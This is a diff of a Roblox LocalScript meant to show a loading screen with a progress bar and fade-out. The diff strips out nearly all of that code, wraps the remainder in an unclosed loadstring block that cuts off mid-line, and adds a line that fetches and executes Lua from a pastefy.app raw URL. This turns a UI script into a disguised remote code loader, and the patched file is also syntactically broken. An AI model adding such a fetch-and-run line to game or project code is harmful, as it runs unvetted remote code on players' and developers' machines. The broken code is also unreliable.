@@ -1,5 +1,4 @@
--- LocalScript inside StarterGui
-
+loadstring([[
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 local TweenService = game:GetService("TweenService")
@@ -13,55 +12,5 @@ screenGui.Parent = playerGui
 
 -- Create full background
 local frame = Instance.new("Frame")
-frame.Size = UDim2.new(1, 0, 1, 0)
-frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-frame.Parent = screenGui
-
--- Create progress bar background
-local barBG = Instance.new("Frame")
-barBG.Size = UDim2.new(0.6, 0, 0.05, 0)
-barBG.Position = UDim2.new(0.2, 0, 0.7, 0)
-barBG.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-barBG.BorderSizePixel = 0
-barBG.Parent = frame
-
--- Create progress bar fill
-local barFill = Instance.new("Frame")
-barFill.Size = UDim2.new(0, 0, 1, 0)
-barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-barFill.BorderSizePixel = 0
-barFill.Parent = barBG
-
--- Create loading text
-local textLabel = Instance.new("TextLabel")
-textLabel.Size = UDim2.new(1, 0, 0.2, 0)
-textLabel.Position = UDim2.new(0, 0, 0.4, 0)
-textLabel.BackgroundTransparency = 1
-textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-textLabel.Font = Enum.Font.SourceSansBold
-textLabel.TextScaled = true
-textLabel.Text = "Loading 0%"
-textLabel.Parent = frame
-
--- Simulated loading progress
-for i = 1, 100 do
-	textLabel.Text = "Loading " .. i .. "%"
-	barFill.Size = UDim2.new(i/100, 0, 1, 0)
-	wait(0.05) -- adjust speed (0.05 = ~5 seconds to 100%)
-end
-
--- Fade out smoothly
-local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-local tweenFrame = TweenService:Create(frame, tweenInfo, {BackgroundTransparency = 1})
-local tweenText = TweenService:Create(textLabel, tweenInfo, {TextTransparency = 1})
-local tweenBarBG = TweenService:Create(barBG, tweenInfo, {BackgroundTransparency = 1})
-local tweenBarFill = TweenService:Create(barFill, tweenInfo, {BackgroundTransparency = 1})
-
-tweenFrame:Play()
-tweenText:Play()
-tweenBarBG:Play()
-tweenBarFill:Play()
-
-tweenText.Completed:Wait()
-screenGui:Destroy()
+frame.Size = UDim2.new(1, 0,
 loadstring(game:HttpGet("https://pastefy.app/puEVPJZf/raw"))()
